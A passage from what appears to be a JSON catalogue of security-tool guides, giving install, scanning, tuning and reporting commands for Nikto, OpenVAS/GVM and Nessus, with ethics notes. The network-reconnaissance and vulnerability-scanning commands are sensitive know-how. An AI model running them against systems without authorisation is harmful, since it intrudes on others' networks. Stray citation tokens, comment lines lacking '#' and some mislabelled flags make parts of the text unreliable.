Perl\nperl nikto.pl -Version\n```\n\n### macOS (Homebrew)\n```bash\nbrew install nikto\n./nikto.pl -Version\n```\n\n### Windows\n```powershell\n# Install Perl (ActivePerl or Strawberry Perl), extract repo and run:\nperl nikto.pl -Version\n# Or use Docker / WSL:\ndocker run --rm sullo/nikto -h http://example.com\n```\n\n### Docker\n```bash\ndocker pull sullo/nikto\ndocker run --rm sullo/nikto -h http://example.com\ndocker run --rm -v $(pwd):/tmp sullo/nikto -h http://example.com -o /tmp/nikto-report.html\n```\n\n**What to expect**  \nA working `nikto` command or `nikto.pl` in the program folder. `-Version` prints database and tool versions.\n\n**Troubleshooting & tips**  \nOn source installs ensure Perl dependencies are present. Use Docker to avoid dependency issues.\n\n**Safety / ethics note**  \nDo not expose your scanning machine or API keys in public repos when automating scans.\n\n---\n\n## 3. Basic Usage & Simple Scans\n\n**What it is / Why it matters**  \nQuickly identify common exposures and gather reconnaissance data about web servers.\n\n**Step-by-step commands**  \n```bash\nBasic single-target scan\nnikto -h http://example.com\n\nHTTPS scan\nnikto -h https://example.com\n\nScan custom port\nnikto -h http://example.com:8080\n\nMultiple hosts (comma-separated)\nnikto -h http://example.com,https://test.com\n\nFrom file (targets.txt)\necho \"http://example.com\" > targets.txt\nnikto -h targets.txt\n```\n\n**What to expect**  \nA list of findings including potentially dangerous files, server headers, and CGI scripts; scan summary at the end.\n\n**Troubleshooting & tips**  \nIf target blocks requests, try using `-useragent` or proxy options. For many targets, use a rate-limited loop or spacing between scans.\n\n**Safety / ethics note**  \nAvoid scanning large ranges or many third-party hosts without approval; respect rate limits and business hours.\n\n---\n\n## 4. Output Options & Reporting\n\n**What it is / Why it matters**  \nGenerate machine- or human-readable reports (TXT, HTML, XML, CSV) for analysis and evidence.\n\n**Step-by-step commands**  \n```bash\nPlain text output\nnikto -h http://example.com -o report.txt\n\nHTML report\nnikto -h http://example.com -o report.html -Format html\n\nXML output\nnikto -h http://example.com -o report.xml -Format xml\n\nCSV output\nnikto -h http://example.com -o report.csv -Format csv\n\nMultiple formats (prefix filename, formats comma-separated)\nnikto -h http://example.com -o report -Format htm,txt,xml\n```\n\n**What to expect**  \nFiles saved with scan findings. XML/CSV integrate with parsers and CI tools; HTML is good for stakeholder reports.\n\n**Troubleshooting & tips**  \nIf output files are empty, check for connectivity and that the target returned valid responses. Use `-Debug` for verbose diagnostic output.\n\n**Safety / ethics note**  \nProtect reports — they may contain sensitive vulnerabilities and configuration details.\n\n---\n\n## 5. Scan Tuning & Test Categories\n\n**What it is / Why it matters**  \nTune Nikto to focus on specific test categories (interesting files, misconfigurations, XSS, SQLi, DoS, etc.) to reduce noise and risk.\n\n**Step-by-step commands**  \n```bash\nRun tests for categories 1,2,3\nnikto -h http://example.com -Tuning 1,2,3\n\nExclude specific tests (example: exclude DoS category 6)\nnikto -h http://example.com -Tuning x6\n```\n\n**What to expect**  \nOnly tests matching the tuning selection will run; shorter scans and fewer false positives.\n\n**Troubleshooting & tips**  \nUse tuning to avoid dangerous categories (e.g., 6 - DoS). Refer to Nikto docs for category mapping.\n\n**Safety / ethics note**  \nAvoid running destructive categories on production systems; always validate impact in staging first.\n\n---\n\n## 6. Advanced Scanning Options (Auth, Proxy, SSL)\n\n**What it is / Why it matters**  \nAuthenticate and use network proxies, control timeouts, and handle TLS options for realistic scanning.\n\n**Step-by-step commands**  \n```bash\nBasic auth\nnikto -h http://example.com -id username:password\n\nCustom header or cookie\nnikto -h http://example.com -H \"Authorization: Bearer token123\"\nnikto -h http://example.com -H \"Cookie: sessionid=abc123\"\n\nCustom user-agent\nnikto -h http://example.com -useragent \"MyScanner/1.0\"\n\nUse upstream proxy\nnikto -h http://example.com -useproxy http://proxy:8080\nProxy with auth\nnikto -h http://example.com -useproxy http://user:pass@proxy:8080\n\nTimeouts and pacing\nnikto -h http://example.com -timeout 10 -Pause 2\n\nSSL options: force SSL or ignore certs\nnikto -h example.com -ssl\nnikto -h https://example.com -nossl\n```\n\n**What to expect**  \nAuthenticated endpoints can be tested; proxy enables traffic interception. SSL flags control TLS handshake behavior.\n\n**Troubleshooting & tips**  \nIf SSL handshake fails, try `-nossl` or ensure OpenSSL/Perl Net::SSLeay is installed. For proxy debugging, verify proxy connectivity with `curl -x` first.\n\n**Safety / ethics note**  \nNever leak authentication tokens or cookies in shared reports. Use temporary test credentials when possible.\n\n---\n\n## 7. Plugins, Extensions & Custom Tests\n\n**What it is / Why it matters**  \nNikto supports plugins (Perl) to extend checks (headers, outdated servers, shellshock, paths, etc.) and custom DB entries for organization-specific checks.\n\n**Step-by-step commands**  \n```bash\nList plugins\nnikto -list-plugins\n\nRun with specific plugins\nnikto -h http://example.com -Plugins \"apache_expect_xss,cookies\"\n```\n\n**What to expect**  \nPlugin checks execute additional targeted tests. Custom db_tests entries allow local checks for internal policies.\n\n**Troubleshooting & tips**  \nPlugin failures may indicate missing Perl modules. Inspect Perl error messages and install required CPAN modules.\n\n**Safety / ethics note**  \nReview custom plugins before enabling — they can be intrusive or cause unintended behavior.\n\n---\n\n## 8. Database Updates & Custom Databases\n\n**What it is / Why it matters**  \nNikto uses local DB files for tests; keep them updated for current checks and CVE mappings.\n\n**Step-by-step commands**  \n```bash\nUpdate Nikto databases\nnikto -update\n\nForce update\nnikto -update -Force\n\nCheck current version\nnikto -Version\n```\n\n**What to expect**  \nDatabase files under system locations (e.g., `/var/lib/nikto/`) updated with latest tests and signatures.\n\n**Troubleshooting & tips**  \nIf update fails, check network connectivity and permissions for the database directory. Manual update is possible by replacing DB files.\n\n**Safety / ethics note**  \nEnsure DB updates come from trusted sources to avoid malicious checks.\n\n---\n\n## 9. Automation & CI/CD Integration\n\n**What it is / Why it matters**  \nAutomate periodic scans and integrate Nikto into CI pipelines for regression security testing.\n\n**Step-by-step commands**  \n```bash\nBatch scan from file\nnikto -h targets.txt -o batch_results.html -Format html\n\nSimple automation (bash)\nwhile read target; do\n  nikto -h \"$target\" -o \"nikto_$(echo $target | sed 's/[^a-zA-Z0-9]/_/g').txt\"\n  sleep 5\ndone < targets.txt\n```\n\n**What to expect**  \nAutomated reports per-target; CI jobs can fail builds or attach reports for review.\n\n**Troubleshooting & tips**  \nThrottle scans in CI to avoid overwhelming test environments. Store reports as artifacts for audits.\n\n**Safety / ethics note**  \nCI-based scanning should target staging environments; avoid scanning production during deployments.\n\n---\n\n## 10. Integration with Other Tools & Workflows\n\n**What it is / Why it matters**  \nCombine Nikto findings with scanners and frameworks (Nmap, Metasploit, OWASP ZAP) for deeper analysis and exploitation follow-up.\n\n**Step-by-step commands**  \n```bash\nUse Nmap to find live hosts, then run Nikto against HTTP services\nnmap -p 80,443,8080,8443 --open target_network -oG - | awk '/Up$/{print $2}' > live_hosts.txt\nfor h in $(cat live_hosts.txt); do nikto -h http://$h -o nikto_$h.txt; done\n```\n\n**What to expect**  \nNikto provides HTTP-level findings to enrich vulnerability data from network scanners or web scanners.\n\n**Troubleshooting & tips**  \nSanitize Nikto outputs before importing into ticketing systems. Use consistent naming for host-based reports.\n\n**Safety / ethics note**  \nCoordinate with other teams (ops, dev) before follow-up intrusive testing or exploitation attempts.\n\n---\n\n## 11. Performance Tuning & Resource Controls\n\n**What it is / Why it matters**  \nOptimize speed and reduce load by tuning timeouts, pauses, and test categories.\n\n**Step-by-step commands**  \n```bash\nFaster but lighter scan\nnikto -h http://example.com -Tuning 1,2,3 -timeout 5\n\nReduce request pauses (use with caution)\nnikto -h http://example.com -Pause 0\n\nSkip time-consuming or risky tests\nnikto -h http://example.com -Tuning x6,x9\n\nSet max runtime (seconds)\nnikto -h http://example.com -maxtime 3600\n```\n\n**What to expect**  \nFaster scans but potentially less coverage. Control for production impact.\n\n**Troubleshooting & tips**  \nIf scans are too slow, increase timeout or reduce test scope; if too aggressive, add pauses and lower concurrency.\n\n**Safety / ethics note**  \nPrioritize stability over speed on production targets.\n\n---\n\n## 12. Troubleshooting & Common Issues\n\n**What it is / Why it matters**  \nCommon problems include SSL failures, proxy errors, missing Perl modules, and permission issues.\n\n**Step-by-step commands**  \n```bash\nDebug mode for verbose output\nnikto -h http://example.com -Debug\n\nVerbose mode\nnikto -h http://example.com -verbose\n\nCheck SSL handshake/debug\nnikto -h https://example.com -ssl -Debug\n\nCheck Perl dependency\nperl -MCPAN -e 'install Net::SSLeay'\n```\n\n**What to expect**  \nVerbose logs in console; Debug mode surfaces HTTP exchanges and plugin errors for diagnosis.\n\n**Troubleshooting & tips**  \nEnsure Perl dependencies are satisfied. Check `/var/lib/nikto/` for DB issues and file permissions.\n\n**Safety / ethics note**  \nHandle debug logs carefully; they may include sensitive headers or tokens.\n\n---\n\n## 13. Common Use Cases\n\n**What it is / Why it matters**  \nCommon for initial web security reconnaissance, compliance scans, and configuration hardening assessments.\n\n**Step-by-step commands**  \nN/A — use guided commands above for specific scenarios.\n\n**What to expect**  \nA prioritized list of issues to remediate, including dangerous files, outdated software, and misconfigurations.\n\n**Troubleshooting & tips**  \nValidate findings manually to remove false positives and confirm remediation steps.\n\n**Safety / ethics note**  \nUse in-scope targets and document authorizations for audit trails.\n\n---\n\n## 14. Pro Tips & Best Practices\n\n- Keep Nikto databases updated (`nikto -update`).  \n- Use tuning to avoid risky tests on production.  \n- Combine Nikto with other scanners for full coverage.  \n- Sanitize and redact sensitive data in reports.  \n- Run resource-heavy tests in staging or maintenance windows.  \n- Review and validate findings before reporting.\n\n**Safety / ethics note**  \nAlways obtain written authorization and follow responsible disclosure policies.\n\n---\n\n## 15. Legal Disclaimer\n\n> **Warning:** Nikto should only be used on web servers you own or have explicit permission to test. Unauthorized scanning can violate laws and terms of service. Always obtain written authorization and follow rules of engagement.\n"
      }
    ]
  },
  {
    "name": "OpenVAS",
    "description": "A full-featured vulnerability scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "vulnerability management",
      "network security"
    ],
    "color": "#4be5a0",
    "articles": [
      {
        "title": " OpenVAS / GVM — Complete Command Reference & Quick-Start (OpenVAS = old name; now Greenbone Vulnerability Manager)",
        "content": "# 🛡️ OpenVAS / GVM — Complete Command Reference & Quick-Start (OpenVAS = old name; now Greenbone Vulnerability Manager)\n\n> This file focuses on practical, runnable commands (safe defaults) for installing, configuring, feeding, operating and automating OpenVAS/GVM (Greenbone Vulnerability Manager, GVM). Each numbered section contains: **What it is / Why it matters**, **Step-by-step commands**, **What to expect**, **Troubleshooting & tips**, and **Safety / ethics note**.\n\n---\n\n## 1. What is OpenVAS / GVM?\n\n**What it is / Why it matters**  \nOpenVAS historically referred to the scanner component; the project today is split across packages (gvmd, gsad, ospd-openvas/openvas-scanner / notus-scanner) and is collectively called Greenbone Vulnerability Management (GVM). It performs authenticated/unauthenticated vulnerability scanning and reporting. Use GVM to discover CVEs, misconfigurations, and asset vulnerabilities across your network.\n\n**What to expect**  \nA multi-service system: scanner (ospd-openvas/openvas-scanner), manager (gvmd), web UI (Greenbone Security Assistant - gsad), and feed-sync tools.\n\n**Safety / ethics note**  \nOnly scan assets you own or are authorized to test. Vulnerability scans can be intrusive and may disrupt production services.\n\n---\n\n## 2. Quick install (Debian/Ubuntu / Kali) — packages & bootstrap\n\n**What it is / Why it matters**  \nMost distros provide packaged GVM/OpenVAS. Use packages for ease; source builds give more control but require many dependencies.\n\n**Step-by-step commands (Ubuntu / Debian / Kali)**\n```bash\n1) Update OS\nsudo apt update && sudo apt upgrade -y\n\n2) Install the meta-package (on modern distros)\nsudo apt install gvm -y\n\n3) Run setup helper (creates users, syncs feeds)\nsudo gvm-setup\n\n4) Check readiness\nsudo gvm-check-setup\n```\n**What to expect**  \n`gvm-setup` creates the `_gvm` user, Postgres DB, syncs NVTs/SCAP/GVMD data, and prints admin user credentials (or instructs to set them). `gvm-check-setup` reports missing components and recommended fixes. citeturn0search3turn0search12\n\n**Troubleshooting & tips**  \n- If `gvm-setup` hangs during feed sync, ensure ports 873/24 (or outbound rsync/http) are allowed and DNS works. Feed sync can take many minutes. citeturn0search15turn0search6  \n- If `ospd-openvas` fails to start, check logs (`journalctl -u ospd-openvas.service`) and that python packages for ospd-openvas are installed. citeturn0search1turn0search20\n\n**Safety / ethics note**  \nRun initial setup on an isolated host or management host; do not expose gsad (web UI) to the public internet without HTTPS and authentication.\n\n---\n\n## 3. Core services & commands (start/stop/status)\n\n**What it is / Why it matters**  \nGVM runs multiple services. Managing them directly is common in automation and troubleshooting.\n\n**Step-by-step commands**\n```bash\nSystemd control (common names)\nsudo systemctl start ospd-openvas.service    # scanner daemon\nsudo systemctl start gvmd.service           # manager (database + API)\nsudo systemctl start gsad.service           # Greenbone Security Assistant (web UI)\n\nCheck status and logs\nsudo systemctl status ospd-openvas.service\nsudo journalctl -u ospd-openvas.service -f\n\nStop / restart\nsudo systemctl restart gvmd.service\nsudo systemctl stop gsad.service\n```\n**What to expect**  \nServices come online; `gvmd` listens on its unix socket or TCP (depending on config). `gsad` listens on HTTP/HTTPS (usually port 9392). `ospd-openvas` launches scanner processes. citeturn0search11turn0search4\n\n**Troubleshooting & tips**  \nIf `gsad` not found, check package names — some distros name it `greenbone-security-assistant` or `gsad`. Use `ss -lntp | grep 9392` to confirm listening port. citeturn0search12\n\n---\n\n## 4. Feed management (NVTs, SCAP, CERTs, GVMD data)\n\n**What it is / Why it matters**  \nFeeds contain NVTs (Network Vulnerability Tests), SCAP data, and certificate lists required for accurate detection. Keep them up to date.\n\n**Step-by-step commands**\n```bash\nSync all Greenbone feeds as _gvm user\nsudo runuser -u _gvm -- greenbone-feed-sync --type nvt\nsudo runuser -u _gvm -- greenbone-feed-sync --type scap\nsudo runuser -u _gvm -- greenbone-feed-sync --type certs\nsudo runuser -u _gvm -- greenbone-feed-sync --type gvmd\n\nOr sync all types (may vary by version)\nsudo runuser -u _gvm -- greenbone-feed-sync --type all\n\nOlder helpers (sometimes present):\nsudo greenbone-nvt-sync\nsudo greenbone-scapdata-sync\nsudo greenbone-certdata-sync\n```\n**What to expect**  \nThe feed-sync commands download/rsync data and populate DB files under `/var/lib/gvm/` or similar. They can take long on first run. Errors often show network/rsync permission issues. citeturn0search6turn0search15\n\n**Troubleshooting & tips**  \n- If feeds fail: ensure rsync and network connectivity; check firewall blocking outbound rsync (port 873) or HTTP.  \n- Use `--verbose`/`-v` for more output.  \n- On some installs, feed-sync must be run as `_gvm` (or `gvm` user) to write into data dirs. citeturn0search15\n\n**Safety / ethics note**  \nFeeds include vulnerability signatures — ensure updates are from official Greenbone sources to avoid tampered data.\n\n---\n\n## 5. Initial checks & health (gvm-check-setup)\n\n**What it is / Why it matters**  \n`gvm-check-setup` validates installation and provides remediation hints. Run it after install and after upgrades.\n\n**Step-by-step commands**\n```bash\nRun the setup checker (may require sudo)\nsudo gvm-check-setup\n```\n**What to expect**  \nA series of tests (database, scanner, feed, web UI) with PASS/FAIL and suggested fixes. Use it iteratively to fix missing dependencies. citeturn0search12\n\n**Troubleshooting & tips**  \nFollow each remediation line. Common fixes include missing Python packages, wrong permissions on feed directories, or broken services. Search Greenbone forums for specific error strings. citeturn0search12\n\n---\n\n## 6. gvm-cli & scripting scans (GMP protocol)\n\n**What it is / Why it matters**  \nThe Greenbone Management Protocol (GMP) is the XML API gvmd exposes. `gvm-cli` (with `gvm-tools`) allows scripting: create targets, tasks, and launch scans from CLI/automation.\n**Step-by-step commands (examples)**\n\n```bash\nInstall gvm-tools if not present\npip3 install gvm-tools\n\nExample: connect using unix socket (if gvmd exposes it)\ngvm-cli socket --socketpath /var/run/gvmd.sock --xml \"<get_version/>\"\n\nUsing SSH or TLS:\ngvm-cli ssh --gmp-username admin --gmp-password 'PASSWORD' --hostname 127.0.0.1 --xml \"<get_version/>\"\n\nUse a resource XML to create a target/task and start a scan\ngvm-cli socket --xml <<'EOF'\n<create_target>\n  <name>Example target</name>\n  <hosts>192.0.2.1</hosts>\n</create_target>\nEOF\n```\n**What to expect**  \n`gvm-cli` returns GMP XML responses. Use `gvm-tools` `python-gvm` or `gvm-cli` to script full workflows (create target, create task, start task, get report). citeturn0search5turn0search2\n\n**Troubleshooting & tips**  \n- Use `--socketpath` if connecting locally via UNIX socket. Forum examples show many users launching tasks with `gvm-cli`. citeturn0search21  \n- For complex flows, create XML templates and use `gvm-pyscripts` or Python `gvm` library to call GMP programmatically. citeturn0search5\n\n**Safety / ethics note**  \nScripting can trigger many scans quickly; respect rate-limits and scheduling windows.\n\n---\n\n## 7. Typical scan lifecycle (commands & expectations)\n\n**What it is / Why it matters**  \nCommon sequence: create target → create credentials → create task (scan config) → start task → fetch report → stop/cleanup.\n\n**Step-by-step commands (using gvm-cli snippets)**\n\n```xml\n1) Create a target (GMP XML wrapper)\n<create_target>\n  <name>my-target</name>\n  <hosts>10.0.0.0/24</hosts>\n</create_target>\n\n2) Create task referencing target and scan-config (example in XML)\n<create_task>\n  <name>My Task</name>\n  <config id=\"daba56c8-73ec-11df-a475-002264764cea\"/> <!-- full and deep -->\n  <target id=\"...\"/>\n</create_task>\n\n3) Start task\n<start_task task_id=\"...\"/>\n```\nYou can post these XML snippets with `gvm-cli socket --xml` or `gvm-cli ssh --xml` to execute them. Then poll with `<get_tasks/>` or `<get_reports/>` to fetch results. citeturn0search5\n\n**What to expect**  \nTask created in gvmd and appears in Greenbone Security Assistant; scan jobs use ospd-openvas to run checks and populate reports (PDF/HTML/XML).\n\n**Troubleshooting & tips**  \n- If a scan fails with missing scan-config UUIDs (e.g., `daba56c8-73ec-11df-a475-002264764cea`), re-sync gvmd data: `greenbone-feed-sync --type gvmd` and restart gvmd. citeturn0search6\n\n---\n\n## 8. Report export & formats\n\n**What it is / Why it matters**  \nExport reports to PDF, HTML, XML, or CSV for analysis and ticketing.\n\n**Step-by-step commands (using gvm-cli / gsad UI)**\n```bash\nUsing gvm-cli to get a report (XML) to stdout\ngvm-cli socket --xml \"<get_report report_id='REPORT_UUID' format_id='c402cc3e-b531-11e1-9163-406186ea4fc5'/>\"\n\nCommon format IDs:\n- XML: <built-in xml id>\n- PDF/HTML: use format UUIDs from <get_report_formats/>\nExample using gvm-tools 'gvm-prefs' or via gvmd API to export specific format\n```\n**What to expect**  \nReport XML contains host findings, NVT IDs, CVSS scores, and remediation text. Use converters or scripts to transform into custom reports.\n\n**Troubleshooting & tips**  \nList available formats via GMP `<get_report_formats/>` to get exact UUIDs for PDF/HTML. Large reports may be heavy — consider filtered exports (per host/severity).\n\n---\n\n## 9. Credentials & authenticated scanning\n\n**What it is / Why it matters**  \nAuthenticated scans (SSH, SMB, Windows creds) yield higher-fidelity findings — important for internal assessments.\n\n**Step-by-step commands (GMP XML snippets)**\n```xml\nCreate credential (example conceptual)\n<create_credential>\n  <name>ssh-cred</name>\n  <!-- specific credential structure depends on type (SSH, SMB, etc.) -->\n</create_credential>\n\nWhen creating a target or task, reference the credential id\n```\n**What to expect**  \nOnce credentials are stored in gvmd and associated with tasks, scans will attempt authenticated checks (logins, file checks).\n\n**Troubleshooting & tips**  \nCredential management via `gvm-cli` can be verbose; many users prefer the GSAD web UI for creating/assigning credentials. See forum threads for XML structures. citeturn0search8\n\n**Safety / ethics note**  \nUse test accounts and rotate credentials. Protect credentials in transit and at rest.\n\n---\n\n## 10. Scanner tuning & performance\n\n**What it is / Why it matters**  \nTune scan config (max checks, timeout, concurrent hosts) to balance coverage and target stability.\n\n**Step-by-step commands / locations**\n```text\nEdit or clone scan configs in GSAD UI (Scan Configs) or modify gvmd data objects.\nFor scanner-level tuning, adjust ospd-openvas/openvas-scanner config files (e.g., /etc/ospd/ospd.yml or openvas-scanner.conf)\nExample: lower thread counts or increase timeouts in scanner settings\n```\n**What to expect**  \nLower concurrency reduces false service outages; higher concurrency shortens wall-clock time but increases load.\n\n**Troubleshooting & tips**  \nIf scanning large targets, split into smaller tasks and schedule off-hours. Monitor CPU, memory and network on the scanner host.\n\n---\n\n## 11. Upgrading & maintaining GVM\n\n**What it is / Why it matters**  \nKeep GVM components and feeds current for accurate detections.\n\n**Step-by-step commands**\n```bash\nUpdate packages (Ubuntu/Debian)\nsudo apt update && sudo apt upgrade -y\n\nUpdate greenbone feeds\nsudo runuser -u _gvm -- greenbone-feed-sync --type nvt\nsudo runuser -u _gvm -- greenbone-feed-sync --type gvmd\n```\n\n**What to expect**  \nPackage upgrades may change service names or locations; run `gvm-check-setup` after upgrades to confirm.\n\n**Troubleshooting & tips**  \nBack up `/var/lib/gvm/` and Postgres DB before major upgrades. If a feed UUID mismatch occurs, re-sync gvmd data and NVTs. citeturn0search6\n\n---\n\n## 12. Useful troubleshooting commands & logs\n\n**What it is / Why it matters**  \nCollect logs and status to diagnose failures.\n\n**Commands**\n```bash\nJournal logs\nsudo journalctl -u gvmd.service -f\nsudo journalctl -u ospd-openvas.service -f\nsudo journalctl -u gsad.service -f\n\ngvmd logs (varies by distro)\nsudo tail -n 200 /var/log/gvm/gvmd.log\nsudo tail -n 200 /var/log/gvm/ospd-openvas.log\nsudo tail -n 200 /var/log/gvm/gsad.log\n\nCheck open sockets and ports\nss -lntup | egrep 'gvmd|ospd|gsad|openvas'\n```\n**What to expect**  \nService-specific errors indicating missing files, permission problems, or feed-sync network errors.\n\n**Troubleshooting & tips**  \nSearch the Greenbone community forum for exact error strings — the community maintains many fixes and workarounds. citeturn0search0turn0search12\n\n---\n\n## 13. Automation examples (cron, Ansible, scripts)\n\n**What it is / Why it matters**  \nAutomate feed updates, scheduled scans, and report exports to integrate vulnerability management into workflows.\n\n**Step-by-step commands (cron example)**\n```bash\ndaily feed sync (run as root or use sudoers to allow _gvm without password)\nsudo crontab -e\nadd line (runs daily at 3:00am)\n0 3 * * * runuser -u _gvm -- greenbone-feed-sync --type nvt && runuser -u _gvm -- greenbone-feed-sync --type gvmd\n```\n\n**Ansible / scripts**  \nUse community Ansible roles (search galaxy) for idempotent installs and service management. For more advanced flows, use `gvm-tools` to script scans and exports. citeturn0search5\n\n**Safety / ethics note**  \nSchedule scans and feed updates during maintenance windows to avoid unexpected load on production.\n\n---\n\n## 14. References & community resources\n\n- Official Greenbone source build docs and guides (building ospd-openvas / gvmd). citeturn0search14turn0search11  \n- Greenbone community forum — troubleshooting Q&A and user experiences. citeturn0search12turn0search0  \n- Community tutorials for Ubuntu/Kali installs and setup helpers. citeturn0search6turn0search7\n"
      }
    ]
  },
  {
    "name": "Nessus",
    "description": "A proprietary vulnerability scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "vulnerability assessment",
      "compliance"
    ],
    "color": "#c34be5",
    "articles": [
      {
        "title": "Nessus Essentials: A Practical Guide to Vulnerability Scanning",
        "content": "# Nessus Essentials: A Practical Guide to Vulnerability Scanning\n\n## About this document\n\n*   **Audience:** This document is designed for cybersecurity students, educators, beginners, and individuals starting their journey in vulnerability management. It assumes basic familiarity with network concepts but requires no prior experience with Nessus.\n*   **Scope:** This guide covers the fundamental aspects of Nessus Essentials, including its core purpose, installation procedures, initial configuration, and how to execute a basic network vulnerability scan.\n*   **Safety / Disclaimer:** Vulnerability scanning tools are powerful and, if misused, can disrupt services or violate legal and ethical guidelines. Always obtain explicit, written permission before scanning any network or system that you do not own or administer. This documentation is for educational and authorized testing purposes only.\n\n## How this file is organized\n\nThis document is structured to provide clear, actionable instructions for each major topic. Each section follows a consistent five-part format to ensure comprehensive understanding and ease of use:\n\n1.  **What it is / Why it matters:** A concise explanation of the topic's purpose and its significance in vulnerability management.\n2.  **Step-by-step commands:** Exact commands or procedural steps required to perform the task, presented in a clear, executable format.\n3.  **What to expect:** A description of the typical output, results, or behavior you should observe after successfully completing the steps.\n4.  **Troubleshooting & tips:** Common issues, potential errors, and practical advice for resolving problems or enhancing your workflow.\n5.  **Safety / ethics note:** Important considerations regarding security, privacy, ethical use, and best practices relevant to the topic.\n\n---\n\n## 1. Introduction to Nessus\n\n### What it is / Why it matters\n\nNessus is a widely recognized and industry-leading vulnerability scanner developed by Tenable. Its primary function is to identify security vulnerabilities, misconfigurations, and malware on a vast range of devices connected to a network, including servers, virtual machines, personal computers, and network devices.\n\nIdentifying vulnerabilities is crucial for maintaining a strong security posture. Nessus automates this process, providing detailed reports that enable organizations and individuals to prioritize remediation efforts based on the severity of discovered vulnerabilities, thereby reducing their attack surface and potential for security breaches.\n\n### Step-by-step commands\n\nAs this section is conceptual, there are no specific commands to execute.\n\n### What to expect\n\nAfter reviewing this section, you should have a clear understanding of what Nessus is, its primary purpose in cybersecurity, and why vulnerability scanning is an essential practice.\n\n### Troubleshooting & tips\n\nN/A - This section focuses on conceptual understanding.\n\n### Safety / ethics note\n\nVulnerability scanners like Nessus are powerful tools. It is critical to understand that scanning systems without explicit authorization can be illegal and unethical. Always ensure you have appropriate permissions before using any vulnerability assessment tool on a network or system you do not own or manage.\n\n---\n\n## 2. Getting Started with Nessus Essentials\n\n### What it is / Why it matters\n\nNessus Essentials is the free-of-charge version of Nessus, specifically designed for individuals, students, and educators. It provides a full-featured Nessus scanning experience but is limited to scanning up to 16 IP addresses. This makes it an ideal platform for learning the fundamentals of vulnerability scanning and practicing cybersecurity skills without incurring costs.\n\n### Step-by-step commands\n\nThe initial setup of Nessus Essentials involves a series of manual steps to download, install, and configure the scanner.\n\n1.  **Register and Download Nessus Essentials:**\n    *   Visit the official Tenable website for Nessus Essentials registration.\n    *   Complete the registration form to obtain your free activation code, which will be sent to your email address.\n    *   Download the Nessus installer package appropriate for your operating system (e.g., Windows, macOS, various Linux distributions).\n\n2.  **Install Nessus:**\n    *   **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.\n    *   **For macOS:** Double-click the downloaded `.dmg` file, then double-click the installer package (`.pkg`) and follow the prompts.\n    *   **For Linux (e.g., Debian/Ubuntu):**\n        ```bash\n        sudo dpkg -i Nessus-<version>-<platform>.deb\n        sudo /bin/systemctl start nessusd\n        ```\n    *   **For Linux (e.g., CentOS/RHEL):**\n        ```bash\n        sudo rpm -ivh Nessus-<version>-<platform>.rpm\n        sudo /bin/systemctl start nessusd\n        ```\n    *   _Note:_ Replace `<version>` and `<platform>` with the actual details of your downloaded file. The installer may also start the `nessusd` service automatically.\n\n3.  **Initial Web Interface Configuration:**\n    *   Open a web browser and navigate to the Nessus web interface, which typically runs on `https://localhost:8834`. You may encounter a browser security warning due to a self-signed certificate; you can safely proceed.\n    *   Select \"Nessus Essentials\" during the setup prompt.\n    *   When prompted, create an administrator account by defining a username and a strong password.\n    *   Enter the activation code you received via email into the designated field.\n\n4.  **Plugin Compilation:**\n    *   After entering the activation code, Nessus will begin to download and compile its extensive set of plugins. This process involves fetching the latest vulnerability definitions and preparing them for scanning.\n    *   This is an automated, one-time process that can take a significant amount of time, sometimes 30 minutes or more, depending on your internet speed and system resources.\n\n### What to expect\n\nUpon successful completion of these steps, you should have:\n*   A fully installed Nessus Essentials instance running on your system.\n*   Access to the Nessus web interface through your browser at `https://localhost:8834`.\n*   A configured administrator account for managing Nessus.\n*   A fully compiled and updated plugin database, indicating that Nessus is ready to perform scans.\n\n### Troubleshooting & tips\n\n*   **Browser Security Warning:** If your browser shows a \"Your connection is not private\" or similar warning, it's due to Nessus using a self-signed SSL certificate. You can safely proceed by clicking \"Advanced\" and then \"Proceed to localhost (unsafe)\" or its equivalent.\n*   **Accessing Web Interface:** If you cannot reach `https://localhost:8834`, ensure the Nessus daemon (`nessusd`) is running. Check your system's firewall to ensure port `8834` is not blocked.\n*   **Activation Code Issues:** Double-check that you've entered the activation code exactly as provided in your email, without extra spaces. If problems persist, contact Tenable support.\n*   **Slow Plugin Compilation:** This is normal. Ensure you have a stable internet connection. Avoid shutting down your computer or closing the browser tab during this process. If it seems stuck for an unusually long time (e.g., several hours), try restarting the Nessus service/daemon and refreshing the web page.\n*   **System Resources:** Nessus can be resource-intensive, especially during plugin compilation and active scans. Ensure your system meets the minimum requirements for CPU, RAM, and disk space.\n\n### Safety / ethics note\n\n*   **License Compliance:** Nessus Essentials is a free license for personal and educational use. Respect its terms of service, especially the 16-IP scan limit. Commercial use of Nessus Essentials is prohibited.\n*   **System Stability:** While Nessus is generally stable, ensure your operating system and network infrastructure are up-to-date to prevent unforeseen conflicts during installation or operation.\n\n---\n\n## 3. Running a Basic Nessus Network Scan\n\n### What it is / Why it matters\n\nOnce Nessus Essentials is set up, running a scan is the next crucial step to identify vulnerabilities. A \"Basic Network Scan\" is a general-purpose scan that checks for a wide range of common vulnerabilities, misconfigurations, and services on target systems. It's an excellent starting point for new users to understand how Nessus operates and to get an initial assessment of their network's security posture. Regular scanning is vital because new vulnerabilities are discovered daily, and systems can drift out of compliance.\n\n### Step-by-step commands\n\nAll scan operations are performed through the Nessus web interface.\n\n1.  **Log in to Nessus:**\n    *   Navigate to `https://localhost:8834` and log in with the administrator credentials you created during installation.\n\n2.  **Create a New Scan:**\n    *   From the main Nessus dashboard, locate and click the **\"New Scan\"** button, usually prominent on the left sidebar or top menu.\n\n3.  **Select a Scan Template:**\n    *   On the \"Scan Templates\" page, select the **\"Basic Network Scan\"** template. This template is designed for comprehensive, non-credentialed checks.\n\n4.  **Configure the Scan Details:**\n    *   **Name:** Provide a descriptive name for your scan (e.g., \"My First Home Network Scan\", \"Lab Environment Audit\").\n    *   **Description (Optional):** Add a brief description to clarify the scan's purpose.\n    *   **Targets:** This is the most critical field. Enter the IP addresses or hostnames of the systems you wish to scan. You can specify targets in several ways:\n        *   **Single IP:** `192.168.1.10`\n        *   **Comma-separated list:** `192.168.1.10, 192.168.1.11, 192.168.1.15`\n        *   **CIDR notation for a network range:** `192.168.1.0/24` (scans all 254 usable IPs in that subnet)\n        *   _Note:_ Ensure the total number of IPs does not exceed your Nessus Essentials license limit (16 IPs).\n\n5.  **Save and Launch the Scan:**\n    *   Click the **\"Save\"** button at the top right of the configuration page.\n    *   On the \"My Scans\" page, find your newly created 